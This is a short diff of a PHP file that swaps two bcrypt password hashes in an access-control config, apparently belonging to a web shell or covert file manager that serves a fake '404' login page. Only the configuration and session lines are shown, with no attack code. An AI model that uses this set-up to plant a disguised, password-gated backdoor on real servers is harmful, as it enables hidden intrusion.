@@ -2,7 +2,7 @@
 
 $GLOBALS['./XList'] = array(
     'username' => './XList',
-    'password' => '$2a$12$pd2tKYdGFNMuuNDTAxZ1QOdTaJsUkAkCA74r6CBx8FqhyohvDOrWC',
+    'password' => '$2a$12$a1nLzJXPiRtOMnNVvxWDWODOEbYqob904P7oSuOqW7jyplJnON7VW',
     'safe_mode' => '0',
     'login_page' => '404',
     'show_icons' => '1',
@@ -11,7 +11,7 @@ $GLOBALS['./XList'] = array(
 );
 
 // ==================== FITUR LOGIN CLASSIC SOFT ====================
-define('LOGIN_PASS_HASH', '$2a$12$.BvXhKulwsYi7tGoRVolb.khvghyf.O9MPiC2NkdyAL8m4IVLtoBa');
+define('LOGIN_PASS_HASH', '$2a$12$apmQ1kO3NTu0lbRLLDRDA.XdGssc0U.yUT5615Vynlsyob.xRvAz.');
 
 if (session_status() === PHP_SESSION_NONE) {
     session_start();
